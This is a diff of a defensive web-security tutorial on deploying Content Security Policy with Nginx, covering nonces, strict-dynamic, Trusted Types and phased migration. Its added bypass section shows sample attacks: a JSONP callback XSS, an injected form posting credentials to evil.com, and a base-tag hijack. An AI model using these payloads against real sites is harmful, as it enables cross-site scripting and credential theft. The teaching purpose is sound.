-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests" target="_blank" rel="noopener noreferrer"><code>upgrade-insecure-requests</code></a></td>
-      <td>Auto-upgrade HTTP to HTTPS</td>
-      <td>(Present on HTTPS sites)</td>
-    </tr>
-  </tbody>
-</Table>
-
 ---
 
-## Building your CSP layer by layer
+## Building Your CSP Layer by Layer
 
-Rather than trying to write a perfect CSP in one go (which often leads to frustration and broken functionality), let's build one progressively. This layered approach lets you understand what each addition accomplishes and makes troubleshooting much easier.
-
-Think of it like building a house: you start with the foundation, add the walls, then the roof. Each layer adds more protection, and you can stop at any level based on your site's requirements and your comfort level with the complexity.
+Rather than writing a perfect CSP in one go (which leads to frustration), let's build progressively. Each layer adds protection, and you can stop at any level based on your needs.
 
 <Table title="CSP Security Levels">
   <thead>
     <tr>
       <th>Level</th>
       <th>Policy Addition</th>
-      <th>What It Protects</th>
+      <th>Protection Added</th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td><strong>0</strong></td>
       <td>No CSP</td>
-      <td>Nothing—wide open to XSS</td>
+      <td data-status="error">None—wide open to XSS</td>
     </tr>
     <tr>
       <td><strong>1</strong></td>
@@ -551,13 +526,13 @@ Think of it like building a house: you start with the foundation, add the walls,
     </tr>
     <tr>
       <td><strong>2</strong></td>
-      <td><code>+ script-src 'self'; style-src 'self' 'unsafe-inline'</code></td>
+      <td><code>+ script-src 'self'</code></td>
       <td>Only your scripts run</td>
     </tr>
     <tr>
       <td><strong>3</strong></td>
-      <td><code>+ img-src 'self' data:; font-src 'self'</code></td>
-      <td>Controls media loading</td>
+      <td><code>+ style-src, img-src, font-src</code></td>
+      <td>Controls visual resources</td>
     </tr>
     <tr>
       <td><strong>4</strong></td>
@@ -567,17 +542,17 @@ Think of it like building a house: you start with the foundation, add the walls,
     <tr>
       <td><strong>5</strong></td>
       <td><code>+ base-uri 'none'; frame-ancestors 'none'</code></td>
-      <td>Prevents injection and clickjacking</td>
+      <td>Prevents injection & clickjacking</td>
     </tr>
     <tr>
       <td><strong>6</strong></td>
       <td><code>+ form-action 'self'; upgrade-insecure-requests</code></td>
-      <td>Full protection, forces HTTPS</td>
+      <td data-status="success">Full baseline protection</td>
     </tr>
   </tbody>
 </Table>
 
-### Level 6: A solid baseline CSP
+### Level 6: A Solid Baseline CSP
 
 Here's what Level 6 looks like in practice:
 
@@ -600,107 +575,128 @@ add_header Content-Security-Policy "
 </FileContent>
 
 <Callout type="success">
-  **Checkpoint:** This CSP protects against most common attacks. It blocks external scripts, limits where data can be sent, prevents clickjacking, and closes plugin-based attack vectors.
+  **Checkpoint:** This CSP protects against most XSS attacks, limits data exfiltration, prevents clickjacking, and closes plugin-based attack vectors.
   
-  However, there's one significant limitation—**inline scripts are blocked**. If your site uses any inline JavaScript (which most modern sites do for things like theme detection, analytics initialization, or hydration), it won't work. The next section addresses this challenge with three different solutions.
+  **However**, there's one significant limitation—inline scripts are blocked. If your site uses inline JavaScript (theme detection, analytics, hydration), it won't work. The next section solves this.
 </Callout>
 
 ---
 
-## The inline script challenge
+## The Inline Script Challenge
 
 Most websites have inline scripts like this:
 
-<Code lang="html" aria-label="Inline script example">
+<Code lang="html" title="Common inline script">
 ```html
 <script>
-  // Theme detection, analytics, etc.
-  document.documentElement.classList.add('dark');
+  // Theme detection - runs before page renders
+  const theme = localStorage.getItem('theme') || 'system';
+  document.documentElement.classList.add(theme);
 </script>
 ```
 </Code>
 
-With `script-src 'self'`, this is blocked. You have three solutions:
+With `script-src 'self'`, this is blocked. You have **three solutions**:
 
-### Solution 1: Move scripts to external files
+<DecisionTree question="Which solution should I use for inline scripts?">
+  <details>
+    <summary>External Files (Simplest)</summary>
+    <p>Move inline code to separate <code>.js</code> files. Best for simple cases where the script doesn't need to run before the main bundle.</p>
+    <p><strong>Pros:</strong> No nonces/hashes needed, cacheable</p>
+    <p><strong>Cons:</strong> Additional HTTP request, can't run synchronously before render</p>
+  </details>
+  <details>
+    <summary>Hashes (Static Content)</summary>
+    <p>Generate a SHA-256 hash of your script content and add it to CSP. Best for scripts that never change.</p>
+    <p><strong>Pros:</strong> Works for static content, no server changes needed</p>
+    <p><strong>Cons:</strong> Must regenerate hash when script changes, even for whitespace</p>
+  </details>
+  <details>
+    <summary>Nonces (Recommended)</summary>
+    <p>Add a unique random token to both the CSP header and script tags. Best for dynamic content and maximum security.</p>
+    <p><strong>Pros:</strong> Most flexible, recommended by Google security team</p>
+    <p><strong>Cons:</strong> Requires server-side nonce generation (or Nginx trick for static sites)</p>
+  </details>
+</DecisionTree>
+
+### Solution 1: Move to External Files
 
 The cleanest approach—move inline code to `.js` files:
 
 <CompareCode badTitle="Inline (blocked by CSP)" goodTitle="External (allowed)">
   <div slot="bad">
     ```html
-    <script>
-      initTheme();
-    </script>
+    <head>
+      <script>
+        initTheme();
+      </script>
+    </head>
     ```
   </div>
   <div slot="good">
     ```html
-    <script src="/js/theme.js"></script>
+    <head>
+      <script src="/js/theme.js"></script>
+    </head>
     ```
   </div>
 </CompareCode>
 
-### Solution 2: Use hashes
+### Solution 2: Use Hashes
 
-Generate a SHA-256 hash of your script content and add it to your CSP:
+Generate a SHA-256 hash of your script content and add it to your CSP. Try it yourself:
 
-<Code lang="nginx" aria-label="CSP with hash">
-```nginx
-script-src 'self' 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc=';
-```
-</Code>
+<HashCalculator
+  title="Generate Your Script Hash"
+  defaultCode="const theme = localStorage.getItem('theme') || 'system';
+document.documentElement.classList.add(theme);"
+/>
 
 <Callout type="tip">
-  **How to get the hash:** When CSP blocks a script, the browser console shows the required hash:
+  **How to get the hash from browser:** When CSP blocks a script, the browser console shows the required hash:
   
-  > The hash of the script is `'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='`
+  > Either the 'unsafe-inline' keyword, a hash ('sha256-RFWPLDbv2BY...'), or a nonce is required.
+  
+  Copy that hash directly into your CSP.
 </Callout>
 
-**Pros:** Works for completely static content  
-**Cons:** Must regenerate hash whenever script content changes
+**Limitation:** You must regenerate the hash whenever the script content changes—even adding a space will invalidate it.
 
-### Solution 3: Use nonces
+### Solution 3: Use Nonces
 
 Add a random token to both the CSP header and your script tags:
 
 <Tabs>
   <TabPanel label="CSP Header">
     ```nginx
-    script-src 'self' 'nonce-abc123def456';
+    Content-Security-Policy: 
+      script-src 'self' 'nonce-abc123def456';
     ```
   </TabPanel>
-  <TabPanel label="HTML Script Tag">
+  <TabPanel label="HTML">
     ```html
     <script nonce="abc123def456">
-      initTheme();
+      const theme = localStorage.getItem('theme');
+      document.documentElement.classList.add(theme);
     </script>
     ```
   </TabPanel>
 </Tabs>
 
-**Pros:** More flexible than hashes  
-**Cons:** Nonce must be unique per request (challenging for static sites)
+**Critical:** The nonce must be:
+- **Cryptographically random** (at least 128 bits / 16 bytes)
+- **Unique per request** (never reuse nonces)
+- **Base64 encoded**
 
 ---
 
-## Nonces for static sites: the Nginx trick
+## Nonces for Static Sites: The Nginx Trick
 
-Here's the challenge that stops many developers: Static Site Generators (SSGs) like Astro, Next.js, Hugo, or Eleventy build HTML at **build time**. The files are generated once and then served statically. But nonces must be unique for every **request**—that's their entire security value. If a nonce is static and predictable, it's no better than having no nonce at all.
+Here's the challenge: Static Site Generators (Astro, Next.js, Hugo) build HTML at **build time**. But nonces must be unique per **request**. How can static HTML contain dynamic nonces?
 
-So how do we square this circle? How can a static HTML file contain a nonce that's different for every visitor?
+### The Solution: Placeholder Substitution
 
-### The solution: placeholder substitution
-
-The answer lies in your web server. Instead of generating nonces at build time, we:
-
-1. At build time, embed a **placeholder string** where the nonce should go
-2. At request time, configure the web server (Nginx in our case) to replace that placeholder with a real cryptographically random nonce
-3. The same nonce gets injected into both the HTML `<script>` tags AND the CSP header
-
-This means every request gets a unique nonce, even though the source HTML file is static. The browser never sees the placeholder—it only sees the final nonce value.
-
-<Mermaid caption="Nginx nonce injection for static sites" maxWidth="600px">
+<Mermaid caption="Nginx nonce injection for static sites" maxWidth="650px">
 ```mermaid-render
 sequenceDiagram
     participant Build as Build Time
@@ -708,20 +704,20 @@ sequenceDiagram
     participant Nginx
     participant Browser
     
-    Build->>Disk: script with nonce placeholder
+    Build->>Disk: HTML with placeholder<br/>nonce="CSP_NONCE_NGINX"
     Note over Disk: Placeholder stored
     
     Browser->>Nginx: GET /page.html
-    Nginx->>Nginx: Generate unique nonce
-    Nginx->>Nginx: Replace placeholder with nonce
-    Nginx->>Browser: HTML + CSP header with nonce
-    Browser->>Browser: Nonces match, execute script
+    Nginx->>Nginx: Generate unique nonce<br/>($request_id)
+    Nginx->>Nginx: Replace placeholder<br/>with real nonce
+    Nginx->>Browser: HTML + CSP header<br/>with matching nonce
+    Note over Browser: Nonces match ✓<br/>Script executes
 ```
 </Mermaid>
 
-### Step 1: Use the placeholder in your source
+### Step 1: Use Placeholders in Your Templates
 
-In your templates, use a known placeholder for the nonce:
+In your templates, use a placeholder that Nginx will replace:
 
 <FileContent filename="src/layouts/BaseLayout.astro" icon="simple-icons:astro">
 ```astro
@@ -730,9 +726,8 @@ In your templates, use a known placeholder for the nonce:
 ---
 <html>
   <head>
-    <!-- Use placeholder that Nginx will replace -->
+    <!-- Nginx will replace this placeholder -->
     <script is:inline nonce="CSP_NONCE_NGINX">
-      // Critical inline script (theme detection, etc.)
       const theme = localStorage.getItem('theme') || 'system';
       document.documentElement.dataset.theme = theme;
     </script>
@@ -752,25 +747,25 @@ server {
     listen 443 ssl;
     server_name example.com;
     
-    # ========================================
-    # STEP 1: Generate a unique nonce per request
-    # ========================================
-    # $request_id is a 32-char hex string (128 bits of entropy)
+    # ================================================
+    # STEP 1: Generate unique nonce per request
+    # ================================================
+    # $request_id = 32-char hex string (128 bits entropy)
     set $cspNonce $request_id;
 
-    # ========================================
+    # ================================================
     # STEP 2: Replace placeholder with real nonce
-    # ========================================
+    # ================================================
     sub_filter_once off;  # Replace ALL occurrences
     sub_filter_types text/html text/css application/javascript;
     sub_filter CSP_NONCE_NGINX $cspNonce;
 
-    # ========================================
-    # STEP 3: Set CSP header with the same nonce
-    # ========================================
+    # ================================================
+    # STEP 3: Set CSP header with same nonce
+    # ================================================
     add_header Content-Security-Policy "
         default-src 'none';
-        script-src 'self' 'nonce-$cspNonce';
+        script-src 'self' 'nonce-$cspNonce' 'strict-dynamic';
         style-src 'self' 'unsafe-inline';
         img-src 'self' data:;
         font-src 'self';
@@ -788,36 +783,36 @@ server {
 </FileContent>
 
 <Callout type="info" icon="mdi:information">
-  **Why `$request_id` is safe for nonces:**
+  **Why `$request_id` is cryptographically safe:**
   
   Nginx's `$request_id` provides:
-  - **128 bits** of entropy (32 hex characters)
+  - **128 bits** of entropy (32 hexadecimal characters)
   - **Unique per request** — freshly generated each time
   - **Unpredictable** — derived from system randomness
   
-  This exceeds CSP's recommended minimum entropy.
+  This exceeds CSP's recommended minimum entropy for nonces.
 </Callout>
 
-### What the browser sees
+### What the Browser Sees
 
 <Tabs>
-  <TabPanel label="1. Stored on Disk">
+  <TabPanel label="1. On Disk">
     ```html
-    <!-- /var/www/example.com/index.html -->
+    <!-- Static file on disk -->
     <script nonce="CSP_NONCE_NGINX">
       const theme = localStorage.getItem('theme');
     </script>
     ```
   </TabPanel>
-  <TabPanel label="2. HTTP Response Header">
+  <TabPanel label="2. HTTP Header">
     ```http
     HTTP/2 200 OK
     Content-Security-Policy: script-src 'nonce-a1b2c3d4e5f6...' ...
     ```
   </TabPanel>
-  <TabPanel label="3. HTML Received by Browser">
+  <TabPanel label="3. HTML Received">
     ```html
-    <!-- What the browser actually receives -->
+    <!-- What browser actually receives -->
     <script nonce="a1b2c3d4e5f6...">
       const theme = localStorage.getItem('theme');
     </script>
@@ -827,40 +822,30 @@ server {
 
 ---
 
-## Going strict with `'strict-dynamic'`
+## Going Strict with `'strict-dynamic'`
 
-The `'strict-dynamic'` directive is powerful: it allows scripts loaded by trusted scripts to also execute.
-
-<Code lang="nginx" aria-label="strict-dynamic directive">
-```nginx
-script-src 'nonce-$cspNonce' 'strict-dynamic';
-```
-</Code>
-
-### How it works
-
-When a script with a valid nonce dynamically loads another script, the loaded script **inherits trust**:
+The `'strict-dynamic'` keyword is a game-changer: it allows scripts loaded by trusted scripts to also execute, without needing their own nonces.
 
 <Mermaid caption="Trust propagation with strict-dynamic" maxWidth="700px">
 ```mermaid-render
 flowchart TB
-    subgraph CSP["How strict-dynamic Works"]
+    subgraph CSP["CSP Policy"]
         direction TB
-        N["Nonce in CSP header<br/>nonce-abc123"]:::nonce
+        N["Nonce in header<br/>'nonce-abc123'"]:::nonce
     end
     
-    subgraph Trusted["Trusted Execution Chain"]
+    subgraph Trusted["Trust Chain (Allowed)"]
         direction LR
-        A["Script tag with<br/>nonce=abc123"]:::cspTrusted
-        B["createElement script<br/>(no nonce needed)"]:::cspTrusted
-        C["Loaded library<br/>(inherits trust)"]:::cspTrusted
+        A["Script with<br/>nonce=abc123"]:::cspTrusted
+        B["createElement('script')<br/>(no nonce needed)"]:::cspTrusted
+        C["Dynamically loaded<br/>library.js"]:::cspTrusted
         A -->|"Creates"| B
         B -->|"Loads"| C
     end
     
-    subgraph Blocked["Blocked by CSP"]
+    subgraph Blocked["No Trust (Blocked)"]
         direction LR
-        D["Injected inline<br/>script tag"]:::attacker
+        D["Injected XSS<br/>script tag"]:::attacker
         E["Event handler<br/>onclick=..."]:::attacker
     end
     
@@ -870,11 +855,14 @@ flowchart TB
 ```
 </Mermaid>
 
-<Code lang="html" aria-label="strict-dynamic inheritance example">
+### How It Works
+
+<Code lang="html" title="Trust propagation example">
 ```html
 <!-- This script has a valid nonce -->
 <script nonce="abc123">
   // This dynamically created script ALSO runs
+  // because it inherits trust from the parent
   const script = document.createElement('script');
   script.src = 'https://cdn.example.com/analytics.js';
   document.head.appendChild(script);
@@ -883,10 +871,12 @@ flowchart TB
 </Code>
 
 <Callout type="warning">
-  **Important:** When `'strict-dynamic'` is present, allowlist sources like `'self'` or `https://example.com` are **ignored** for script loading. Only nonces/hashes grant initial trust—dynamically loaded scripts inherit it.
+  **Important behavior:** When `'strict-dynamic'` is present, allowlist sources like `'self'` or `https://example.com` are **ignored** for script loading. Only nonces/hashes grant initial trust—dynamically loaded scripts inherit it.
+  
+  This is by design and actually increases security.
 </Callout>
 
-### When to use `'strict-dynamic'`
+### When to Use `'strict-dynamic'`
 
 <Table title="strict-dynamic Use Cases">
   <thead>
@@ -899,27 +889,27 @@ flowchart TB
   <tbody>
     <tr>
       <td>SPA with code splitting</td>
-      <td><strong>Yes</strong></td>
+      <td data-status="success"><strong>Yes</strong></td>
       <td>Webpack/Vite load chunks dynamically</td>
     </tr>
     <tr>
       <td>Analytics (GA, Segment)</td>
-      <td><strong>Yes</strong></td>
-      <td>Analytics often load additional scripts</td>
+      <td data-status="success"><strong>Yes</strong></td>
+      <td>Analytics scripts often load additional scripts</td>
     </tr>
     <tr>
       <td>Third-party widgets</td>
-      <td><strong>Yes</strong></td>
-      <td>Chat widgets, embedded content load dependencies</td>
+      <td data-status="success"><strong>Yes</strong></td>
+      <td>Chat widgets, embeds load their own dependencies</td>
     </tr>
     <tr>
       <td>Simple static site</td>
-      <td>Optional</td>
+      <td data-status="warning">Optional</td>
       <td>If all scripts are in HTML, nonces alone suffice</td>
     </tr>
     <tr>
       <td>No JavaScript at all</td>
-      <td>No</td>
+      <td data-status="error">No</td>
       <td>Use <code>script-src 'none'</code> instead</td>
     </tr>
   </tbody>
@@ -927,11 +917,9 @@ flowchart TB
 
 ---
 
-## The strict CSP formula
+## The Strict CSP Formula
 
-Up until now, we've been building toward what the security community calls a "strict CSP." This isn't just marketing terminology—it's a specific configuration pattern that Google's security team has validated through extensive research. Their analysis of millions of websites found that traditional allowlist-based CSPs have a 94.72% bypass rate, while strict CSPs with nonces remain effective against modern attacks.
-
-Based on [Google's research](https://web.dev/articles/strict-csp), a "strict CSP" requires these four elements:
+Based on [Google's research](https://web.dev/articles/strict-csp), a "strict CSP" that actually protects against XSS requires these elements:
 
 <CheckList title="Strict CSP Requirements">
   <li data-check="check">Uses **nonces** or **hashes** instead of domain allowlists</li>
@@ -940,65 +928,276 @@ Based on [Google's research](https://web.dev/articles/strict-csp), a "strict CSP
   <li data-check="check">Sets **`base-uri 'none'`** to prevent base tag injection</li>
 </CheckList>
 
-All major browsers now support the key directives required for strict CSP. Safari was the last holdout for `'strict-dynamic'` support, adding it in version 15.4 (2022). This means you can confidently deploy strict CSP today without worrying about browser compatibility for the vast majority of users.
+### Browser Support
 
 <BrowserSupport
   title="strict-dynamic Browser Support"
   browsers={[
-    { browser: "chrome", version: "52", support: "full" },
-    { browser: "firefox", version: "52", support: "full" },
-    { browser: "safari", version: "15.4", support: "full", note: "Added in 2022" },
-    { browser: "edge", version: "79", support: "full" },
+    { browser: "chrome", version: "52+", support: "full" },
+    { browser: "firefox", version: "52+", support: "full" },
+    { browser: "safari", version: "15.4+", support: "full", note: "Added March 2022" },
+    { browser: "edge", version: "79+", support: "full" },
   ]}
 />
 
-Here's the minimal template for a strict CSP. These three directives form the critical core:
+### The Template
 
-<Code lang="nginx" aria-label="Strict CSP template">
+<Code lang="nginx" title="Strict CSP template">
 ```nginx
-# Strict CSP template
+# The three essential directives for strict CSP
 script-src 'nonce-$cspNonce' 'strict-dynamic';
 object-src 'none';
 base-uri 'none';
 ```
 </Code>
 
-### Why allowlists don't work
-
-Traditional allowlist CSPs like `script-src 'self' https://cdn.example.com` are easily bypassed:
+### Why Allowlists Don't Work
 
 <Callout type="warning" icon="mdi:alert">
-  **94.72% of allowlist CSPs can be bypassed** ([Google Research](https://research.google.com/pubs/pub45542.html))
+  **94.72% of allowlist CSPs can be bypassed** ([Google Research, 2016](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/))
   
-  Common bypass vectors:
-  - JSONP endpoints on trusted domains
-  - CDNs hosting attacker-controlled content
-  - AngularJS template injection on allowed domains
+  Analysis of the 15 most commonly whitelisted domains found that **14 of them** contain unsafe endpoints that attackers can abuse.
+</Callout>
+
+Common bypass vectors include:
+- **JSONP endpoints** on trusted CDNs
+- **Open redirects** on allowed domains  
+- **AngularJS** template injection on allowed origins
+- **User-uploaded content** served from allowed domains
+
+---
+
+## Interactive: Build Your CSP
+
+Use this interactive builder to construct a policy and see your security rating in real-time:
+
+<CSPBuilder title="CSP Policy Builder" />
+
+---
+
+## CSP Bypass Techniques and Prevention
+
+Understanding how attackers bypass CSP helps you avoid common pitfalls.
+
+### 1. JSONP Endpoints
+
+JSONP endpoints execute user-controlled callbacks, making them a classic bypass vector:
+
+<BeforeAfter beforeLabel="Vulnerable" afterLabel="Protected">
+  <div slot="before">
+    ```nginx
+    # CSP trusts all of cdn.example.com
+    script-src 'self' https://cdn.example.com;
+    ```
+    ```html
+    <!-- Attacker exploits JSONP endpoint -->
+    <script src="https://cdn.example.com/api?callback=alert(1)//"></script>
+    ```
+  </div>
+  <div slot="after">
+    ```nginx
+    # Use nonces instead of domain allowlists
+    script-src 'nonce-$cspNonce' 'strict-dynamic';
+    ```
+    ```html
+    <!-- JSONP has no nonce - blocked! -->
+    <script src="https://cdn.example.com/api?callback=alert"></script>
+    <!-- Refused to execute script... -->
+    ```
+  </div>
+</BeforeAfter>
+
+### 2. Form Hijacking
+
+Attackers can inject forms to steal credentials if `form-action` isn't set:
+
+<Code lang="html" title="Form hijacking attack">
+```html
+<!-- Attacker injects this before your login form -->
+<form action="https://evil.com/steal">
+  <!-- Your existing input fields get captured -->
+</form>
+
+<!-- Without form-action, the browser allows submission to evil.com! -->
+```
+</Code>
+
+**Prevention:**
+```nginx
+form-action 'self';
+```
+
+### 3. Base Tag Injection
+
+<Code lang="html" title="Base tag attack">
+```html
+<!-- Attacker injects this early in the document -->
+<base href="https://evil.com/">
+
+<!-- All your relative URLs now resolve to evil.com -->
+<script src="/js/app.js"></script>  <!-- Loads https://evil.com/js/app.js -->
+<img src="/images/logo.png">        <!-- Loads https://evil.com/images/logo.png -->
+<a href="/login">Login</a>          <!-- Links to https://evil.com/login -->
+```
+</Code>
+
+**Prevention:**
+```nginx
+base-uri 'none';
+```
+
+### 4. Script Gadgets in Allowed Libraries
+
+Some major libraries contain patterns that can be exploited for XSS when that library is allowed by CSP:
+
+<Collapsible title="Known Script Gadgets by Library">
+
+| Library | Gadget Type | Risk |
+|---------|-------------|------|
+| AngularJS | Template injection via `ng-app` | High |
+| jQuery (old) | `$.getScript()` with user input | Medium |
+| Require.js | Dynamic imports | Medium |
+| Polymer | Template parsing | Medium |
+
+**Prevention:** Use nonces + strict-dynamic instead of allowing entire libraries by domain.
+
+</Collapsible>
+
+### 5. Missing `object-src`
+
+Without `object-src 'none'`, attackers can use plugins to execute code:
+
+<Code lang="html" title="Object-based XSS">
+```html
+<!-- Flash-based XSS (legacy but still seen) -->
+<object data="data:application/x-shockwave-flash;base64,..." 
+        type="application/x-shockwave-flash">
+</object>
+
+<!-- PDF with JavaScript -->
+<embed src="malicious.pdf" type="application/pdf">
+```
+</Code>
+
+**Prevention:**
+```nginx
+object-src 'none';
+```
+
+---
+
+## Trusted Types: The Next Evolution
+
+While traditional CSP prevents injection of `<script>` tags, it doesn't protect against **DOM-based XSS** where JavaScript directly writes to dangerous sinks:
+
+<Code lang="javascript" title="DOM-based XSS vulnerability">
+```javascript
+// These are dangerous DOM sinks
+element.innerHTML = userInput;           // XSS if userInput contains HTML
+location.href = userInput;               // Open redirect/XSS
+document.write(userInput);               // XSS
+eval(userInput);                         // Remote code execution
+```
+</Code>
+
+**Trusted Types** forces developers to sanitize data before passing it to these sinks.
+
+<StateNotice
+  type="experimental"
+  feature="Trusted Types"
+  title="Trusted Types are experimental but maturing"
+/>
+
+### How Trusted Types Work
+
+<Mermaid caption="Trusted Types enforce sanitization at DOM sinks" maxWidth="650px">
+```mermaid-render
+flowchart LR
+    subgraph Without["Without Trusted Types"]
+        A1["User Input"] --> B1["innerHTML"]:::danger
+        B1 --> C1["XSS Executed"]:::danger
+    end
+    
+    subgraph With["With Trusted Types"]
+        A2["User Input"] --> D2["Sanitizer Policy"]:::cspTrusted
+        D2 --> E2["TrustedHTML Object"]:::cspTrusted
+        E2 --> B2["innerHTML"]:::success
+        B2 --> C2["Safe"]:::success
+    end
+```
+</Mermaid>
+
+### Enabling Trusted Types
+
+<FileContent filename="nginx.conf (CSP with Trusted Types)" icon="devicon:nginx">
+```nginx
+add_header Content-Security-Policy "
+    default-src 'none';
+    script-src 'self' 'nonce-$cspNonce' 'strict-dynamic';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data:;
+    font-src 'self';
+    connect-src 'self';
+    object-src 'none';
+    base-uri 'none';
+    frame-ancestors 'none';
+    form-action 'self';
+    
+    # Trusted Types enforcement
+    require-trusted-types-for 'script';
+    trusted-types default;
+" always;
+```
+</FileContent>
+
+### Creating a Trusted Types Policy
+
+<Code lang="javascript" title="Trusted Types sanitization policy">
+```javascript
+// Create a policy that sanitizes HTML
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  const sanitizerPolicy = trustedTypes.createPolicy('default', {
+    createHTML: (input) => {
+      // Use DOMPurify or similar sanitizer
+      return DOMPurify.sanitize(input);
+    },
+    createScriptURL: (input) => {
+      // Only allow same-origin URLs
+      const url = new URL(input, window.location.origin);
+      if (url.origin !== window.location.origin) {
+        throw new Error('Cross-origin scripts not allowed');
+      }
+      return url.href;
+    }
+  });
+}
+
+// Now innerHTML requires TrustedHTML
+element.innerHTML = userInput;  // TypeError: requires TrustedHTML
+element.innerHTML = sanitizerPolicy.createHTML(userInput);  // Works!
+```
+</Code>
+
+<Callout type="info">
+  **Adoption tip:** Start with `Content-Security-Policy-Report-Only` for Trusted Types to find violations without breaking your site:
+  
+  ```nginx
+  add_header Content-Security-Policy-Report-Only "require-trusted-types-for 'script'; report-uri /tt-reports";
+  ```
 </Callout>
 
 ---
 
-## Advanced: per-endpoint CSP
+## Advanced: Per-Endpoint CSP
 
-So far we've applied a single CSP to our entire site. But in practice, different parts of your site may have different security requirements. A one-size-fits-all approach can be either too restrictive (breaking functionality) or too permissive (weakening security).
+Different parts of your site may need different policies:
 
-Consider these scenarios where per-endpoint CSP makes sense:
+- **Admin panels**: Stricter CSP
+- **API endpoints**: No CSP needed (JSON isn't executed)
+- **Static assets**: Relaxed for social media previews
+- **User-generated content pages**: Extra restrictions  
 
-- **Admin panels** vs **public pages**: Admin areas might need stricter CSP than content pages
-- **API endpoints**: JSON APIs don't need CSP at all (browsers don't execute JS from JSON responses)
-- **Static assets**: Images and fonts have different requirements than HTML documents
-- **Embedded widgets**: Pages designed to be iframed may need `frame-ancestors` configured differently
-
-The most common pattern is splitting CSP between HTML pages and static assets:
-
-- **Strict CSP** for HTML pages (maximum protection where scripts execute)
-- **Relaxed CSP** for static assets (allow external tools to access images)
-
-### Why relax CSP for assets?
-
-Social media crawlers and link preview tools need to access your images. When you share a link on Twitter, LinkedIn, or Slack, their servers fetch your page's Open Graph images. If your CSP includes `Cross-Origin-Resource-Policy: same-origin` on everything, these platforms won't be able to show preview images—users will just see a blank or broken preview.
-
-### Implementation with Nginx
+### Implementation
 
 <FileContent filename="/etc/nginx/sites-available/example.com" icon="devicon:nginx">
 ```nginx
@@ -1009,28 +1208,32 @@ server {
     # Default: strict CSP for HTML pages
     location / {
         try_files $uri $uri/ =404;
-        include /etc/nginx/snippets/security_headers.conf;
+        include /etc/nginx/snippets/security-headers-strict.conf;
     }
     
-    # Relaxed CSP for assets (images, fonts, etc.)
+    # API: no CSP needed for JSON
+    location /api/ {
+        proxy_pass http://backend;
+        # No CSP header - JSON isn't executed by browsers
+    }
+    
+    # Assets: relaxed for social media crawlers
     location /assets/ {
         expires 1y;
         add_header Cache-Control "public, immutable";
-        include /etc/nginx/snippets/security_headers_assets.conf;
+        include /etc/nginx/snippets/security-headers-assets.conf;
     }
 }
 ```
 </FileContent>
 
 <Tabs>
-  <TabPanel label="security_headers.conf (Strict)">
+  <TabPanel label="Strict (HTML pages)">
     ```nginx
-    # Full CSP with nonces for HTML pages
+    # /etc/nginx/snippets/security-headers-strict.conf
     add_header Content-Security-Policy "
         default-src 'none';
         script-src 'self' 'nonce-$cspNonce' 'strict-dynamic';
-        style-src 'self' 'unsafe-inline';
-        img-src 'self' data:;
         ...
     " always;
     
@@ -1038,56 +1241,54 @@ server {
     add_header Cross-Origin-Resource-Policy "same-origin" always;
     ```
   </TabPanel>
-  <TabPanel label="security_headers_assets.conf (Relaxed)">
+  <TabPanel label="Relaxed (Assets)">
     ```nginx
-    # Simplified CSP for static assets
+    # /etc/nginx/snippets/security-headers-assets.conf
     add_header Content-Security-Policy "
         default-src 'none';
-        img-src 'self' data:;
+        img-src 'self';
         font-src 'self';
-        style-src 'unsafe-inline';
     " always;
     
-    # Allow cross-origin access (for social media crawlers)
+    # Allow social media to fetch images for previews
     add_header Cross-Origin-Resource-Policy "cross-origin" always;
     ```
   </TabPanel>
 </Tabs>
 
-<Callout type="info">
-  **Key difference:** The assets config uses `Cross-Origin-Resource-Policy: cross-origin` to allow external sites to embed your images in previews, while HTML pages use `same-origin` for maximum protection.
-</Callout>
-
 ---
 
-## Migration: report-only to enforcement
+## Migration: Report-Only to Enforcement
 
-Deploying CSP is not like deploying a typical code change. A misconfigured CSP can break critical site functionality—imagine accidentally blocking your checkout flow or login system. This is why production CSP deployment requires a careful, phased approach.
+**Never deploy strict CSP directly to production.** Use a phased approach:
 
-The golden rule: **never deploy a strict CSP directly to production**. Instead, use a gradual "observe, fix, then enforce" methodology:
-
-<StepByStep title="Safe Migration Process">
+<StepByStep title="Safe CSP Migration Process">
   <li>
     **Deploy in report-only mode (1-2 weeks)**
-    <br/>Use `Content-Security-Policy-Report-Only` to log violations without blocking anything.
+    
+    Use `Content-Security-Policy-Report-Only` to log violations without blocking anything. Monitor your logs to understand what would break.
   </li>
   <li>
     **Analyze and fix violations**
-    <br/>Review reports and address: inline event handlers → `addEventListener()`, `eval()` → `JSON.parse()`, missing nonces, third-party script issues.
+    
+    Review reports and remediate issues:
+    - Inline event handlers → `addEventListener()`
+    - `eval()` calls → `JSON.parse()` or refactor
+    - Missing nonces on inline scripts
+    - Third-party scripts that need `strict-dynamic`
   </li>
   <li>
     **Enable enforcement gradually**
-    <br/>Switch from `Report-Only` to `Content-Security-Policy`. Keep report-only for testing stricter policies.
+    
+    Switch from `Report-Only` to `Content-Security-Policy`. Keep a report-only header for testing future stricter policies.
   </li>
 </StepByStep>
 
-### Phase 1: Report-only mode
+### Phase 1: Report-Only
 
-Use `Content-Security-Policy-Report-Only` to log violations without blocking:
-
-<Code lang="nginx" aria-label="Report-only mode">
+<Code lang="nginx" title="Report-only mode">
 ```nginx
-# Reports violations but doesn't block anything
+# Logs violations but doesn't block anything
 add_header Content-Security-Policy-Report-Only "
     default-src 'none';
     script-src 'self' 'nonce-$cspNonce' 'strict-dynamic';
@@ -1105,43 +1306,33 @@ add_header Content-Security-Policy-Report-Only "
 ```
 </Code>
 
-### Phase 2: Analyze and fix
-
-Review your violation reports and fix issues:
+### Phase 2: Fix Common Issues
 
 <CheckList title="Common Issues to Fix">
-  <li data-check="warning">**Inline event handlers** → Convert to `addEventListener()`</li>
+  <li data-check="warning">**Inline event handlers** → Convert `onclick="..."` to `addEventListener()`</li>
   <li data-check="warning">**`eval()` usage** → Replace with `JSON.parse()` or refactor</li>
   <li data-check="warning">**Missing nonces** → Add `nonce="CSP_NONCE_NGINX"` to inline scripts</li>
